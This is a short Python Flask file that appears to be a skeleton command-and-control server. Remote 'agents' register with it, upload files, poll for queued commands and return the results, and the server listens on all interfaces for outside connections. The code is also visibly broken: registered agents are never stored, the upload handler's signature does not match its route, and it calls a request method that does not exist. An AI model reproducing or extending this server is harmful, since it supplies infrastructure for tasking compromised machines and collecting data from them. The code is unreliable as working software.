from flask import Flask, request, jsonify
import uuid
import click
import datetime
import random
import json

app = Flask(__name__)
# Basic storage for agent data
agents = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    print(data)
    id = str(uuid.uuid4())
    agent_id = {
        "agent-id": id
    }
    agent_id.update(data)
    print(agent_id)
    return agent_id

@app.route('/upload/<file>', methods=['POST'])
def upload():
    data = request.content()
    print(data)
    return "thanks", 201, {'Content-Type': 'text/plain'}

@app.route('/ping', methods=['POST'])
def ping():
    return "ok", 201, {'Content-Type': 'text/plain'}

@app.route('/send_command/<agent_id>', methods=['GET'])
def get_command(agent_id):
    if agent_id in agents and agents[agent_id]["tasks"]:
        command = agents[agent_id]["tasks"].pop(0)
        return jsonify({"command": command})
    return jsonify({"command": None})

@app.route('/submit_result/<agent_id>', methods=['POST'])
def submit_result(agent_id):
    result = request.json.get("result")
    if agent_id in agents:
        agents[agent_id]["results"].append(result)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    # Run on 0.0.0.0 to make it accessible to external agents
    app.run(host='0.0.0.0', port=5000)